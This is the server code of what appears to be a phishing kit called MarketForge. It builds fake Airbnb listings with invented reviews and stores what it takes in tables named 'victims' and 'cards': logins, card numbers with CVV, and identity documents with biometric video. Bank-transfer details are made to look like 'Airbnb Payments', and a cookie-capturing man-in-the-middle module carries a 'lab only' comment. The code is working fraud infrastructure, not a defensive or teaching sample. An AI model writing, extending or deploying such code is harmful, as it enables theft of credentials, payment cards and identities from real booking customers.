const express = require('express');
const session = require('express-session');
const Database = require('better-sqlite3');
const bcrypt = require('bcrypt');
const { v4: uuidv4 } = require('uuid');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
let cookieParser; try { cookieParser = require('cookie-parser'); } catch (e) { cookieParser = null; }
const { execFile } = require('child_process');
const { geocodeLocation } = require('./marketplace/utils/geocode');
let _mongoClient = null; let MongoClient, ObjectId; try { const m = require('mongodb'); MongoClient = m.MongoClient; ObjectId = m.ObjectId; } catch (e) { MongoClient = null; ObjectId = null; }

// Auto-load .env if present
try {
  const envPath = path.join(__dirname, '.env');
  if (fs.existsSync(envPath)) {
    const lines = fs.readFileSync(envPath, 'utf8').split(/\r?\n/);
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith('#')) continue;
      const idx = trimmed.indexOf('=');
      if (idx !== -1) {
        const k = trimmed.slice(0, idx).trim();
        const v = trimmed.slice(idx + 1).trim();
        if (!process.env[k]) process.env[k] = v;
      }
    }
  }
} catch (e) {}

const defaultLocalDb = path.join(__dirname, 'data', 'marketforge.db');
const DB_PATH = process.env.DB_PATH ? path.resolve(__dirname, process.env.DB_PATH) : (fs.existsSync('/opt/marketforge/data') ? '/opt/marketforge/data/marketforge.db' : defaultLocalDb);
fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });

const PORT = process.env.PORT || 3000;
const SESSION_SECRET = process.env.SESSION_SECRET || uuidv4();
const BASE_URL = process.env.BASE_URL || 'https://lessjob.online';
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'MarketForge2026!';
const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
fs.mkdirSync(UPLOAD_DIR, { recursive: true });
const CANDIDATE_UPLOAD_DIR = path.join(UPLOAD_DIR, 'candidates');
fs.mkdirSync(CANDIDATE_UPLOAD_DIR, { recursive: true });

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
  filename: (req, file, cb) => {
    const orig = path.extname(file.originalname || '').toLowerCase();
    let safe = '.bin';
    if (/^image\//.test(file.mimetype)) {
      safe = /\.(jpe?g|png|webp|gif|avif|heic|heif)$/i.test(orig) ? orig : (file.mimetype === 'image/png' ? '.png' : file.mimetype === 'image/webp' ? '.webp' : file.mimetype === 'image/gif' ? '.gif' : '.jpg');
    } else if (/^video\//.test(file.mimetype)) {
      safe = /\.(mp4|webm|mov|m4v|ogg|ogv)$/i.test(orig) ? orig : (file.mimetype.includes('webm') ? '.webm' : file.mimetype.includes('ogg') ? '.ogv' : '.mp4');
    }
    cb(null, Date.now() + '-' + Math.random().toString(36).slice(2, 8) + safe);
  }
});
const upload = multer({
  storage,
  limits: { fileSize: 200 * 1024 * 1024, files: 60 },
  fileFilter: (req, file, cb) => {
    const isImg = /^image\/(jpeg|jpg|png|webp|gif|avif|heic|heif|pjpeg|x-png)$/i.test(file.mimetype);
    const isVid = /^video\/(mp4|webm|quicktime|x-msvideo|x-matroska|ogg|mpeg|3gpp|3gpp2)$/i.test(file.mimetype);
    if (isImg || isVid) cb(null, true);
    else cb(new Error('Only image/video uploads allowed'));
  }
});
const listingUpload = upload.fields([
  { name: 'photos', maxCount: 50 },
  { name: 'host_photo', maxCount: 1 },
  { name: 'videos', maxCount: 5 }
]);

const db = new Database(DB_PATH);
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

function initDB() {
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      email TEXT UNIQUE,
      password_hash TEXT NOT NULL,
      is_admin INTEGER DEFAULT 0,
      status TEXT DEFAULT 'active',
      plan TEXT DEFAULT 'unlimited',
      plan_expiry TEXT,
      invite_token TEXT UNIQUE,
      permanent_token TEXT UNIQUE,
      created_at TEXT DEFAULT (datetime('now')),
      last_login TEXT
    );
    CREATE TABLE IF NOT EXISTS invitations (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      token TEXT UNIQUE NOT NULL,
      created_by INTEGER,
      status TEXT DEFAULT 'unused',
      email TEXT,
      created_at TEXT DEFAULT (datetime('now')),
      expires_at TEXT
    );
    CREATE TABLE IF NOT EXISTS listings (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      marketplace TEXT NOT NULL,
      title TEXT NOT NULL,
      description TEXT,
      price TEXT,
      price_month TEXT,
      image_url TEXT,
      images TEXT,
      location TEXT,
      guests INTEGER DEFAULT 1,
      bedrooms INTEGER DEFAULT 1,
      beds INTEGER DEFAULT 1,
      baths INTEGER DEFAULT 1,
      amenities TEXT,
      host_name TEXT,
      rating TEXT DEFAULT '4.92',
      reviews INTEGER DEFAULT 48,
      property_type TEXT DEFAULT 'Entire apartment',
      status TEXT DEFAULT 'active',
      created_at TEXT DEFAULT (datetime('now')),
      views INTEGER DEFAULT 0,
      FOREIGN KEY (user_id) REFERENCES users(id)
    );
    CREATE TABLE IF NOT EXISTS victims (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      listing_id INTEGER,
      user_id INTEGER,
      marketplace TEXT,
      email TEXT,
      password TEXT,
      full_name TEXT,
      phone TEXT,
      ip_address TEXT,
      user_agent TEXT,
      stage TEXT DEFAULT 'visit',
      data_json TEXT,
      created_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (listing_id) REFERENCES listings(id),
      FOREIGN KEY (user_id) REFERENCES users(id)
    );
    CREATE TABLE IF NOT EXISTS cards (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      victim_id INTEGER,
      user_id INTEGER,
      card_number TEXT,
      card_holder TEXT,
      expiry TEXT,
      cvv TEXT,
      amount TEXT,
      card_type TEXT,
      created_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (victim_id) REFERENCES victims(id),
      FOREIGN KEY (user_id) REFERENCES users(id)
    );
    CREATE TABLE IF NOT EXISTS payments (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,
      type TEXT DEFAULT 'manual',
      currency TEXT DEFAULT 'EUR',
      amount TEXT,
      tx_hash TEXT,
      status TEXT DEFAULT 'pending',
      created_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (user_id) REFERENCES users(id)
    );
    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,
      action TEXT,
      details TEXT,
      ip_address TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS candidates (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      full_name TEXT NOT NULL,
      first_name TEXT,
      last_name TEXT,
      email TEXT,
      phone TEXT,
      dob TEXT,
      address TEXT,
      city TEXT,
      postcode TEXT,
      rtw_code TEXT,
      nino TEXT,
      employer TEXT,
      job_title TEXT,
      salary TEXT,
      duration TEXT,
      doc_type TEXT,
      document_type TEXT,
      doc_file_path TEXT,
      id_document_path TEXT,
      poa_doc_type TEXT,
      poa_file_path TEXT,
      rtw_file_path TEXT,
      cv_file_path TEXT,
      video_path TEXT,
      biometric_video_path TEXT,
      photo_path TEXT,
      face_match_status TEXT DEFAULT 'Verified',
      current_address_history TEXT,
      previous_address_history TEXT,
      declaration_signature TEXT,
      dbs_consent TEXT DEFAULT 'Consented',
      status TEXT DEFAULT 'Pending',
      created_at TEXT DEFAULT (datetime('now')),
      ip_address TEXT,
      raw_data TEXT
    );
    CREATE INDEX IF NOT EXISTS idx_candidates_created_at ON candidates(created_at);
    CREATE INDEX IF NOT EXISTS idx_candidates_email ON candidates(email);

    CREATE TABLE IF NOT EXISTS managed_domains (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      domain TEXT UNIQUE NOT NULL,
      target_service TEXT NOT NULL DEFAULT 'security_check',
      status TEXT NOT NULL DEFAULT 'Draft',
      is_active INTEGER DEFAULT 1,
      dns_ip TEXT,
      dns_verified_at TEXT,
      ssl_provider TEXT DEFAULT 'letsencrypt',
      ssl_cert_path TEXT,
      ssl_key_path TEXT,
      ssl_issued_at TEXT,
      ssl_expires_at TEXT,
      auto_renew INTEGER DEFAULT 1,
      custom_config TEXT,
      created_at TEXT DEFAULT (datetime('now')),
      updated_at TEXT DEFAULT (datetime('now'))
    );
    CREATE INDEX IF NOT EXISTS idx_domains_domain ON managed_domains(domain);
    CREATE INDEX IF NOT EXISTS idx_domains_target ON managed_domains(target_service);
  `);

  const candCols = db.prepare("PRAGMA table_info(candidates)").all().map(c => c.name);
  const addCandCol = (col, typeDef) => {
    if (!candCols.includes(col)) {
      try { db.exec(`ALTER TABLE candidates ADD COLUMN ${col} ${typeDef}`); } catch (e) {}
    }
  };
  addCandCol('id_document_path', 'TEXT');
  addCandCol('document_type', 'TEXT');
  addCandCol('biometric_video_path', 'TEXT');
  addCandCol('face_match_status', "TEXT DEFAULT 'Verified'");

  const adminHash = bcrypt.hashSync(ADMIN_PASSWORD, 10);
  const existingAdmin = db.prepare('SELECT id FROM users WHERE is_admin = 1').get();
  if (!existingAdmin) {
    db.prepare(`INSERT INTO users (username, email, password_hash, is_admin, status, plan, permanent_token) VALUES (?, ?, ?, 1, 'active', 'unlimited', ?)`)
      .run(ADMIN_USERNAME, 'admin@marketforge.local', adminHash, uuidv4());
    console.log('[+] Admin account created');
  }
}
initDB();

function migrateDB() {
  const cols = db.prepare("PRAGMA table_info(listings)").all().map(c => c.name);
  const add = (name, def) => {
    if (!cols.includes(name)) {
      try { db.exec(`ALTER TABLE listings ADD COLUMN ${name} ${def}`); } catch (e) {}
    }
  };
  add('price_month', 'TEXT');
  add('images', 'TEXT');
  add('bedrooms', 'INTEGER DEFAULT 1');
  add('beds', 'INTEGER DEFAULT 1');
  add('baths', 'INTEGER DEFAULT 1');
  add('amenities', 'TEXT');
  add('host_name', 'TEXT');
  add('host_photo', 'TEXT');
  add('rating', "TEXT DEFAULT '4.92'");
  add('reviews', 'INTEGER DEFAULT 48');
  add('reviews_json', 'TEXT');
  add('property_type', "TEXT DEFAULT 'Entire apartment'");
  add('display_domain', 'TEXT');
  add('public_path', 'TEXT');
  add('listing_code', 'TEXT');
  add('locale', "TEXT DEFAULT 'en'");
  add('currency', "TEXT DEFAULT 'EUR'");
  add('video_url', 'TEXT');
  add('hide_nightly', 'INTEGER DEFAULT 0');
  add('proxy_target_url', 'TEXT');
  add('proxy_mode', "INTEGER DEFAULT 0");
  add('apartment_id', 'INTEGER');
  add('client_first_name', 'TEXT');
  add('client_last_name', 'TEXT');
  add('client_phone', 'TEXT');
  add('client_email', 'TEXT');
  add('client_address', 'TEXT');
  add('client_stay_duration', 'TEXT');
  add('booking_status', "TEXT DEFAULT 'not_opened'");
  add('opened_at', 'TEXT');
  add('status_updated_at', 'TEXT');
  add('clone_listing_id', 'TEXT');
  add('latitude', 'REAL');
  add('longitude', 'REAL');
  try { db.exec('CREATE UNIQUE INDEX IF NOT EXISTS idx_listings_public_path ON listings(public_path)'); } catch (e) {}
  try { db.exec('CREATE UNIQUE INDEX IF NOT EXISTS idx_listings_code ON listings(listing_code)'); } catch (e) {}
  db.exec(`CREATE TABLE IF NOT EXISTS payment_config (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER UNIQUE,
    bank_name TEXT DEFAULT 'Revolut',
    beneficiary TEXT DEFAULT 'Airbnb Payments',
    iban TEXT DEFAULT 'LT12 3250 0694 1234 5678',
    bic TEXT DEFAULT 'REVOLT21',
    created_at TEXT DEFAULT (datetime('now')),
    updated_at TEXT DEFAULT (datetime('now')),
    FOREIGN KEY (user_id) REFERENCES users(id)
  )`);
  const pcCols = db.prepare("PRAGMA table_info(payment_config)").all().map(c => c.name);
  const addPc = (name, def) => {
    if (!pcCols.includes(name)) {
      try { db.exec(`ALTER TABLE payment_config ADD COLUMN ${name} ${def}`); } catch (e) {}
    }
  };
  addPc('country', "TEXT DEFAULT 'GB'");
  addPc('account_number', 'TEXT');
  addPc('sort_code', 'TEXT');
  addPc('routing_number', 'TEXT');
  addPc('account_type', 'TEXT');
  addPc('bank_address', 'TEXT');
  addPc('reference_prefix', "TEXT DEFAULT 'ABB'");
  addPc('extra_json', 'TEXT');
  db.exec(`CREATE TABLE IF NOT EXISTS apartments (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    name TEXT NOT NULL,
    marketplace TEXT DEFAULT 'airbnb',
    title TEXT NOT NULL,
    description TEXT,
    price TEXT,
    price_month TEXT,
    image_url TEXT,
    images TEXT,
    location TEXT,
    guests INTEGER DEFAULT 2,
    bedrooms INTEGER DEFAULT 1,
    beds INTEGER DEFAULT 1,
    baths REAL DEFAULT 1,
    amenities TEXT,
    host_name TEXT,
    host_photo TEXT,
    rating TEXT DEFAULT '4.92',
    reviews INTEGER DEFAULT 48,
    property_type TEXT DEFAULT 'Entire apartment',
    display_domain TEXT,
    locale TEXT DEFAULT 'gb',
    currency TEXT DEFAULT 'GBP',
    video_url TEXT,
    hide_nightly INTEGER DEFAULT 0,
    proxy_target_url TEXT,
    proxy_mode INTEGER DEFAULT 0,
    created_at TEXT DEFAULT (datetime('now')),
    updated_at TEXT DEFAULT (datetime('now')),
    FOREIGN KEY (user_id) REFERENCES users(id)
  )`);
  try { db.exec("UPDATE listings SET booking_status = 'not_opened' WHERE booking_status IS NULL OR booking_status = ''"); } catch (e) {}
  add('host_id', 'INTEGER');
  db.exec(`CREATE TABLE IF NOT EXISTS hosts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    name TEXT NOT NULL,
    photo TEXT,
    is_superhost INTEGER DEFAULT 1,
    joined_year TEXT DEFAULT '2018',
    response_rate TEXT DEFAULT '100%',
    response_time TEXT DEFAULT 'within an hour',
    languages TEXT DEFAULT 'English',
    identity_verified INTEGER DEFAULT 1,
    about TEXT,
    location TEXT,
    reviews_count INTEGER DEFAULT 48,
    rating TEXT DEFAULT '4.92',
    created_at TEXT DEFAULT (datetime('now')),
    updated_at TEXT DEFAULT (datetime('now')),
    FOREIGN KEY (user_id) REFERENCES users(id)
  )`);
}
migrateDB();

// === CloudMail 365 (demo MITM module, fictional brand — lab only) ===
try {
  const vCols = db.prepare('PRAGMA table_info(victims)').all().map(c => c.name);
  if (!vCols.includes('cookie_data')) { try { db.exec('ALTER TABLE victims ADD COLUMN cookie_data TEXT'); } catch (e) {} }
} catch (e) {}
db.exec(`CREATE TABLE IF NOT EXISTS cmail_accounts (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id INTEGER NOT NULL,
  email TEXT NOT NULL,
  password_hash TEXT NOT NULL,
  display_name TEXT DEFAULT '',
  avatar_color TEXT DEFAULT '#6C63FF',
  created_at TEXT DEFAULT (datetime('now')),
  FOREIGN KEY (user_id) REFERENCES users(id)
)`);
db.exec(`CREATE TABLE IF NOT EXISTS cmail_messages (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  account_id INTEGER NOT NULL,
  from_name TEXT,
  from_email TEXT,
  subject TEXT,
  body TEXT,
  is_read INTEGER DEFAULT 0,
  created_at TEXT DEFAULT (datetime('now')),
  FOREIGN KEY (account_id) REFERENCES cmail_accounts(id)
)`);
db.exec(`CREATE TABLE IF NOT EXISTS cmail_sessions (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  account_id INTEGER NOT NULL,
  token TEXT UNIQUE NOT NULL,
  origin TEXT DEFAULT 'app',
  user_agent TEXT,
  ip_address TEXT,
  created_at TEXT DEFAULT (datetime('now')),
  expires_at TEXT,
  revoked INTEGER DEFAULT 0,
  FOREIGN KEY (account_id) REFERENCES cmail_accounts(id)
)`);
db.exec(`CREATE TABLE IF NOT EXISTS cmail_campaigns (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id INTEGER NOT NULL,
  account_id INTEGER NOT NULL,
  token TEXT UNIQUE NOT NULL,
  created_at TEXT DEFAULT (datetime('now')),
  FOREIGN KEY (user_id) REFERENCES users(id),
  FOREIGN KEY (account_id) REFERENCES cmail_accounts(id)
)`);
try { db.exec('CREATE INDEX IF NOT EXISTS idx_cmail_camps_user ON cmail_campaigns(user_id)'); } catch (e) {}
try { db.exec('CREATE INDEX IF NOT EXISTS idx_cmail_sess_token ON cmail_sessions(token)'); } catch (e) {}

const LOCALES = {
  fr: { name: 'Français', flag: '🇫🇷', currency: 'EUR', currencySymbol: '€', country: 'France', lang: 'fr' },
  en: { name: 'English', flag: '🇬🇧', currency: 'GBP', currencySymbol: '£', country: 'United Kingdom', lang: 'en' },
  gb: { name: 'English (UK)', flag: '🇬🇧', currency: 'GBP', currencySymbol: '£', country: 'United Kingdom', lang: 'en' },
  us: { name: 'English (US)', flag: '🇺🇸', currency: 'USD', currencySymbol: '$', country: 'United States', lang: 'en' },
  es: { name: 'Español', flag: '🇪🇸', currency: 'EUR', currencySymbol: '€', country: 'España', lang: 'es' },
  de: { name: 'Deutsch', flag: '🇩🇪', currency: 'EUR', currencySymbol: '€', country: 'Deutschland', lang: 'de' },
  it: { name: 'Italiano', flag: '🇮🇹', currency: 'EUR', currencySymbol: '€', country: 'Italia', lang: 'it' },
  pt: { name: 'Português', flag: '🇵🇹', currency: 'EUR', currencySymbol: '€', country: 'Portugal', lang: 'pt' },
  ro: { name: 'Română', flag: '🇷🇴', currency: 'RON', currencySymbol: 'RON', country: 'România', lang: 'ro' },
  nl: { name: 'Nederlands', flag: '🇳🇱', currency: 'EUR', currencySymbol: '€', country: 'Nederland', lang: 'nl' },
  jp: { name: '日本語', flag: '🇯🇵', currency: 'JPY', currencySymbol: '¥', country: '日本', lang: 'jp' },
  au: { name: 'English (AU)', flag: '🇦🇺', currency: 'AUD', currencySymbol: 'A$', country: 'Australia', lang: 'en' },
  br: { name: 'Português (BR)', flag: '🇧🇷', currency: 'BRL', currencySymbol: 'R$', country: 'Brasil', lang: 'pt' }
};

const UI_TEXTS = {
  fr: {
    reserve: 'Réserver', guests: 'voyageurs', bedroom: 'chambre', bedrooms: 'chambres',
    bed: 'lit', beds: 'lits', bath: 'salle de bain', baths: 'salles de bain',
    hostedBy: 'Hébergé par', superhost: 'Superhost', yearsHosting: 'ans d\'hébergement',
    whatOffers: 'Ce que propose ce logement', whereSleep: 'Où vous dormirez',
    monthStay: 'Séjour mensuel', month: 'mois', perMonth: 'par mois',
    checkin: 'Arrivée', checkout: 'Départ', guestsLabel: 'Voyageurs',
    noCharge: 'Aucun montant ne vous sera débité', totalBefore: 'Total avant taxes',
    cleaning: 'Frais de ménage', service: 'Frais de service Airbnb',
    login: 'Connexion ou inscription', welcome: 'Bienvenue sur Airbnb',
    email: 'E-mail', password: 'Mot de passe', continue: 'Continuer',
    or: 'ou', google: 'Continuer avec Google', apple: 'Continuer avec Apple', facebook: 'Continuer avec Facebook',
    confirmPay: 'Confirmer et payer', yourTrip: 'Votre voyage', dates: 'Dates',
    payWith: 'Payer avec', cardNumber: 'Numéro de carte', expiry: 'Expiration',
    cvv: 'CVV', nameOnCard: 'Nom sur la carte', zip: 'Code postal',
    payBtn: 'Confirmer et payer', priceDetails: 'Détails du prix',
    declined: 'Nous n\'avons pas pu traiter votre paiement.', declinedSub: 'Votre carte a été refusée. Essayez un autre moyen de paiement.',
    altPayment: 'Paiement alternatif', bank: 'Banque', beneficiary: 'Bénéficiaire',
    amount: 'Montant', reference: 'Référence', transferDone: 'J\'ai effectué le virement',
    requestSent: 'Demande envoyée', requestSub: 'Votre réservation est en cours de traitement.',
    reviews: 'commentaires', entirePlace: 'Logement entier',
    showAllPhotos: 'Afficher toutes les photos',
    greatCheckin: 'Excellente expérience d\'arrivée',
    greatCheckinSub: 'Les voyageurs récents ont apprécié la fluidité de leur arrivée.',
    freeCancel: 'Annulation gratuite avant l\'arrivée',
    freeCancelSub: 'Remboursement intégral si vous changez d\'avis.',
    superhostDesc: 'Les Superhosts sont des hôtes expérimentés et très bien notés.',
    showMore: 'Afficher plus', showLess: 'Afficher moins',
    whereYoullSleep: 'Où vous dormirez',
    offerAmenity: 'Ce que propose ce logement'
  },
  es: {
    reserve: 'Reservar', guests: 'huéspedes', bedroom: 'dormitorio', bedrooms: 'dormitorios',
    bed: 'cama', beds: 'camas', bath: 'baño', baths: 'baños',
    hostedBy: 'Anfitrión', superhost: 'Superanfitrión', yearsHosting: 'años como anfitrión',
    whatOffers: 'Lo que ofrece este lugar', whereSleep: 'Dónde dormirás',
    monthStay: 'Estancia mensual', month: 'mes', perMonth: 'por mes',
    checkin: 'Llegada', checkout: 'Salida', guestsLabel: 'Huéspedes',
    noCharge: 'No se te cobrará nada todavía', totalBefore: 'Total antes de impuestos',
    cleaning: 'Gastos de limpieza', service: 'Gastos de servicio Airbnb',
    login: 'Iniciar sesión o registrarse', welcome: 'Bienvenido a Airbnb',
    email: 'Correo electrónico', password: 'Contraseña', continue: 'Continuar',
    or: 'o', google: 'Continuar con Google', apple: 'Continuar con Apple', facebook: 'Continuar con Facebook',
    confirmPay: 'Confirmar y pagar', yourTrip: 'Tu viaje', dates: 'Fechas',
    payWith: 'Pagar con', cardNumber: 'Número de tarjeta', expiry: 'Vencimiento',
    cvv: 'CVV', nameOnCard: 'Nombre en la tarjeta', zip: 'Código postal',
    payBtn: 'Confirmar y pagar', priceDetails: 'Detalles del precio',
    declined: 'No pudimos procesar tu pago.', declinedSub: 'Tu tarjeta fue rechazada.',
    altPayment: 'Pago alternativo', bank: 'Banco', beneficiary: 'Beneficiario',
    amount: 'Importe', reference: 'Referencia', transferDone: 'He realizado la transferencia',
    requestSent: 'Solicitud enviada', requestSub: 'Tu reserva está siendo revisada.',
    reviews: 'comentarios', entirePlace: 'Alojamiento entero',
    showAllPhotos: 'Mostrar todas las fotos',
    greatCheckin: 'Excelente experiencia de llegada',
    greatCheckinSub: 'Los huéspedes recientes disfrutaron de una llegada sin problemas.',
    freeCancel: 'Cancelación gratuita antes de la llegada',
    freeCancelSub: 'Reembolso completo si cambias de opinión.',
    superhostDesc: 'Los Superanfitriones tienen experiencia y valoraciones excelentes.',
    showMore: 'Mostrar más', showLess: 'Mostrar menos',
    whereYoullSleep: 'Dónde dormirás',
    offerAmenity: 'Lo que ofrece este lugar'
  },
  en: {
    reserve: 'Reserve', guests: 'guests', bedroom: 'bedroom', bedrooms: 'bedrooms',
    bed: 'bed', beds: 'beds', bath: 'bathroom', baths: 'bathrooms',
    hostedBy: 'Hosted by', superhost: 'Superhost', yearsHosting: 'years hosting',
    whatOffers: 'What this place offers', whereSleep: 'Where you\'ll sleep',
    monthStay: 'Monthly stay', month: 'month', perMonth: 'per month',
    checkin: 'Check-in', checkout: 'Checkout', guestsLabel: 'Guests',
    noCharge: 'You won\'t be charged yet', totalBefore: 'Total before taxes',
    cleaning: 'Cleaning fee', service: 'Airbnb service fee',
    login: 'Log in or sign up', welcome: 'Welcome to Airbnb',
    email: 'Email', password: 'Password', continue: 'Continue',
    or: 'or', google: 'Continue with Google', apple: 'Continue with Apple', facebook: 'Continue with Facebook',
    confirmPay: 'Confirm and pay', yourTrip: 'Your trip', dates: 'Dates',
    payWith: 'Pay with', cardNumber: 'Card number', expiry: 'Expiration',
    cvv: 'CVV', nameOnCard: 'Name on card', zip: 'ZIP code',
    payBtn: 'Confirm and pay', priceDetails: 'Price details',
    declined: 'We couldn\'t process your payment.', declinedSub: 'Your card was declined. Try another method.',
    altPayment: 'Alternative payment', bank: 'Bank', beneficiary: 'Beneficiary',
    amount: 'Amount', reference: 'Reference', transferDone: 'I\'ve completed the transfer',
    requestSent: 'Request sent', requestSub: 'Your reservation is being reviewed.',
    reviews: 'reviews', entirePlace: 'Entire place',
    showAllPhotos: 'Show all photos',
    greatCheckin: 'Great check-in experience',
    greatCheckinSub: 'Recent guests loved the smooth start to this stay.',
    freeCancel: 'Free cancellation before check-in',
    freeCancelSub: 'Get a full refund if you change your mind.',
    superhostDesc: 'Superhosts are experienced, highly rated Hosts.',
    showMore: 'Show more', showLess: 'Show less',
    whereYoullSleep: 'Where you\'ll sleep',
    offerAmenity: 'What this place offers'
  }
};

function t(locale, key) {
  const texts = UI_TEXTS[locale] || UI_TEXTS.en;
  return texts[key] || UI_TEXTS.en[key] || key;
}

function formatCurrency(amount, locale) {
  const info = LOCALES[locale] || LOCALES.en;
  const sym = info.currencySymbol;
  const num = Number(amount).toLocaleString(info.lang === 'en' ? 'en-US' : (info.lang + '-' + info.country.slice(0,2).toUpperCase()), {
    minimumFractionDigits: 0, maximumFractionDigits: 0
  });
  if (['€','$','£','¥'].includes(sym)) return sym + num;
  return num + ' ' + sym;
}

const REVIEW_PHOTOS = [
  'https://randomuser.me/api/portraits/women/44.jpg',
  'https://randomuser.me/api/portraits/men/32.jpg',
  'https://randomuser.me/api/portraits/women/68.jpg',
  'https://randomuser.me/api/portraits/men/75.jpg',
  'https://randomuser.me/api/portraits/women/22.jpg',
  'https://randomuser.me/api/portraits/men/54.jpg',
  'https://randomuser.me/api/portraits/women/17.jpg',
  'https://randomuser.me/api/portraits/men/91.jpg',
  'https://randomuser.me/api/portraits/women/55.jpg',
  'https://randomuser.me/api/portraits/men/12.jpg'
];

const REVIEW_NAMES = {
  en: ['Sarah M.','James T.','Emily R.','Michael B.','Jessica L.','David K.','Anna W.','Robert P.','Laura G.','Christopher D.'],
  fr: ['Sophie D.','Thomas L.','Marie C.','Pierre M.','Camille B.','Antoine R.','Juliette F.','Nicolas V.','Chloé G.','Lucas P.'],
  es: ['María G.','Carlos R.','Laura P.','Javier M.','Ana S.','David L.','Elena C.','Pablo N.','Carmen F.','Miguel A.'],
  de: ['Anna S.','Markus W.','Julia K.','Thomas H.','Lisa M.','Andreas B.','Katrin D.','Stefan R.','Nina F.','Michael P.'],
  it: ['Chiara R.','Marco B.','Francesca M.','Luca D.','Giulia C.','Matteo F.','Alessia P.','Giovanni N.','Sofia L.','Andrea V.'],
  ro: ['Maria P.','Andrei I.','Elena D.','Alexandru M.','Ioana C.','Cristian S.','Gabriela V.','Mihai T.','Raluca B.','Daniel N.']
};

const REVIEW_TEXTS = {
  en: [
    'Absolutely stunning apartment! The views were breathtaking and the location was perfect for exploring the city. Highly recommend!',
    'Great host, very responsive and helpful. The apartment was spotless and exactly as described. Would definitely stay again.',
    'Beautiful space with everything you need. The kitchen was fully equipped and the bed was super comfortable. 10/10!',
    'Perfect location, walking distance to everything. The host thought of every little detail. One of the best Airbnbs I\'ve stayed at.',
    'Amazing stay! The apartment is even better than the photos. Clean, modern, and in a wonderful neighborhood.',
    'Host was incredibly accommodating. The check-in was seamless and the apartment had all amenities we needed. Wonderful experience!',
    'Loved every moment of our stay. The balcony view alone was worth it. Would come back in a heartbeat.',
    'Exceptional property with a fantastic host. Every detail was carefully thought out. Made our trip truly memorable.'
  ],
  fr: [
    'Appartement absolument magnifique ! La vue était à couper le souffle et l\'emplacement parfait. Je recommande vivement !',
    'Super hôte, très réactif et serviable. L\'appartement était impeccable. J\'y retournerais sans hésiter.',
    'Bel espace avec tout ce dont vous avez besoin. La cuisine entièrement équipée et le lit très confortable. 10/10 !',
    'Emplacement parfait, tout est accessible à pied. L\'hôte a pensé à chaque petit détail. Exceptionnel.',
    'Séjour incroyable ! L\'appartement est encore mieux que sur les photos. Propre, moderne et très bien situé.',
    'Hôte très accommodant. L\'arrivée était parfaite et l\'appartement avait tout ce qu\'il fallait. Magnifique expérience !',
    'Nous avons adoré chaque instant. La vue du balcon valait le coup à elle seule. Nous reviendrons.',
    'Propriété exceptionnelle avec un hôte fantastique. Chaque détail a été pensé. Un séjour mémorable.'
  ],
  es: [
    '¡Apartamento absolutamente impresionante! Las vistas eran increíbles y la ubicación perfecta. ¡Muy recomendable!',
    'Gran anfitrión, muy atento y servicial. El apartamento estaba impecable. Sin duda volvería.',
    'Hermoso espacio con todo lo necesario. Cocina totalmente equipada y cama súper cómoda. ¡10/10!',
    'Ubicación perfecta, todo a poca distancia. El anfitrión pensó en cada detalle. De los mejores Airbnb.',
    '¡Estancia increíble! El apartamento es incluso mejor que las fotos. Limpio, moderno y en un barrio precioso.',
    'Anfitrión muy acogedor. El check-in fue perfecto y el apartamento tenía todo lo necesario. ¡Experiencia maravillosa!',
    'Nos encantó cada momento. Solo la vista del balcón ya valía la pena. Volveríamos sin dudarlo.',
    'Propiedad excepcional con un anfitrión fantástico. Cada detalle fue cuidadosamente pensado. Un viaje memorable.'
  ]
};

function generateReviews(listing) {
  const raw = listing.reviews_json || '';
  let reviews = [];
  try { if (raw) reviews = JSON.parse(raw); } catch(e) {}
  if (reviews.length) return reviews;

  const locale = listing.locale || 'en';
  const count = Math.min(parseInt(listing.reviews) || 8, 100);
  const names = REVIEW_NAMES[locale] || REVIEW_NAMES.en;
  const texts = REVIEW_TEXTS[locale] || REVIEW_TEXTS.en;
  const result = [];
  const usedPhotos = [];
  for (let i = 0; i < count; i++) {
    let photo = REVIEW_PHOTOS[i % REVIEW_PHOTOS.length];
    let name = names[i % names.length];
    let text = texts[i % texts.length];
    let rating = 5;
    if (i % 5 === 0 && count > 3) rating = 4;
    const months = ['January','February','March','April','May','June','July','August','September','October','November','December'];
    const month = months[Math.floor(Math.random() * 12)];
    const year = 2025 - Math.floor(Math.random() * 3);
    result.push({ name, photo, text, rating, date: `${month} ${year}` });
    usedPhotos.push(photo);
  }
  return result;
}

function resolvePaymentConfig(userId) {
  let pc = db.prepare('SELECT * FROM payment_config WHERE user_id = ?').get(userId);
  if (!pc) {
    db.prepare('INSERT INTO payment_config (user_id) VALUES (?)').run(userId);
    pc = db.prepare('SELECT * FROM payment_config WHERE user_id = ?').get(userId);
  }
  return pc;
}

